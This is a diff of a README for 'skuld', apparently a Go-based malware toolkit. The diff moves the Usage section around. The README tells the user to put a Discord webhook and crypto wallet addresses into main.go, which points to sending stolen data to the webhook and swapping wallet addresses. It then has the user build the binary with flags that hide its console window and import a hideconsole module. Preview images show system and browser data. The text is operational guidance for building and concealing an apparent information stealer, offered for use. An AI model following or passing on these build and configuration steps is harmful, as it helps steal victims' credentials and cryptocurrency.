@@ -97,17 +97,22 @@ git clone https://github.com/hackirby/skuld
 cd skuld
 ```
 
+## Usage
+
+You can use the Project template:
+
 - Open `main.go` and edit config with your Discord webhook and your crypto addresses
+
 ![](assets/config.png)
 
-- Build the Project template: (You can reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
+- Build the template: (You can reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
 
 ```bash
 go build -ldflags "-s -w -H=windowsgui"
 ```
 
-## Usage
-A template is available at `main.go`, but you can also use skuld in your own Go code. Just import the desired module like this:
+
+but you can also use skuld in your own Go code. Just import the desired module like this:
 ```go
 package main
 
@@ -119,6 +124,7 @@ func main() {
   hideconsole.Run()
 }
 ```
+
 ## Preview
 ![](assets/system.png)
 ![](assets/browsers.png)
